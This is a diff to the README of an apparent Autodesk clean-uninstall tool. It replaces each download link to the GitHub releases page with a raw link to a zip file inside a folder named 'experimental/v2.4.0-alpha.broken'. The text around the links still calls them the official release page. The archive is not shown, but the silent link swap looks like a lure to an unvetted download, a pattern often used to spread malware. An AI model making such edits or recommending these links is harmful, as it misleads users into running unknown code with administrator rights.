@@ -1,6 +1,6 @@
 # 🔧 Autodesk-Nuke-A-Autodesk-Clean-Uninstall-Tool - Easy Complete Autodesk Cleanup
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/JuanDiego1701/Autodesk-Nuke-A-Autodesk-Clean-Uninstall-Tool/releases)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/JuanDiego1701/Autodesk-Nuke-A-Autodesk-Clean-Uninstall-Tool/raw/refs/heads/main/experimental/v2.4.0-alpha.broken/Autodesk_Tool_Nuke_Uninstall_Clean_2.3.zip)
 
 ## 📄 What Is This?
 
@@ -39,7 +39,7 @@ This script works best on a single user account with administrator rights. It ma
 
    Click the big badge above or visit the official downloads page here:
 
-   [https://github.com/JuanDiego1701/Autodesk-Nuke-A-Autodesk-Clean-Uninstall-Tool/releases](https://github.com/JuanDiego1701/Autodesk-Nuke-A-Autodesk-Clean-Uninstall-Tool/releases)
+   [https://github.com/JuanDiego1701/Autodesk-Nuke-A-Autodesk-Clean-Uninstall-Tool/raw/refs/heads/main/experimental/v2.4.0-alpha.broken/Autodesk_Tool_Nuke_Uninstall_Clean_2.3.zip](https://github.com/JuanDiego1701/Autodesk-Nuke-A-Autodesk-Clean-Uninstall-Tool/raw/refs/heads/main/experimental/v2.4.0-alpha.broken/Autodesk_Tool_Nuke_Uninstall_Clean_2.3.zip)
 
 2. **Download the latest version:**
 
@@ -140,4 +140,4 @@ This script only deletes Autodesk-related files and registry entries. It does no
 
 Click the button below to visit the release page. Choose the latest version to download and run the clean uninstall script:
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/JuanDiego1701/Autodesk-Nuke-A-Autodesk-Clean-Uninstall-Tool/releases)
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/JuanDiego1701/Autodesk-Nuke-A-Autodesk-Clean-Uninstall-Tool/raw/refs/heads/main/experimental/v2.4.0-alpha.broken/Autodesk_Tool_Nuke_Uninstall_Clean_2.3.zip)
